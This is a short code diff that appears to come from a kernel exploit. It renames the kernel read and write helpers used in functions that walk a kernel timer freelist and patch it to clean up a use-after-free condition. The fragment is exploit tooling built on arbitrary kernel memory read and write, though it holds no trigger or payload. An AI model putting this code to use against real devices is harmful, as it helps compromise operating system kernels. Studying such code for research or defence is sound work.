@@ -65,7 +65,7 @@ static void *find_orphan() {
   }
 
   /* account for list head */
-  void *first_freed = (void *)kreadint_real(ktimer_pool_head);
+  void *first_freed = (void *)kreadint(ktimer_pool_head);
   if (first_freed) {
     reachable[TOBJ_ADDR_TO_IDX(ktimer_base, first_freed)] = true;
   }
@@ -90,7 +90,7 @@ static void **find_parent() {
   // traverse linked list until next points to userspace
   void *current_node = ktimer_pool_head;
   while (true) {
-    void *next = (void *)kreadint_real(current_node);
+    void *next = (void *)kreadint(current_node);
 
     if (next == (void *)TIMER2_NEXT_KERNEL) {
       return current_node;
@@ -122,6 +122,6 @@ bool cleanup_uaf() {
 
   printf("Found parent and orphan: %p -> %p\n", parent, orphan);
 
-  kwriteint_real((u32 *)parent, (u32)orphan);
+  kwriteint((u32 *)parent, (u32)orphan);
   return true;
 }
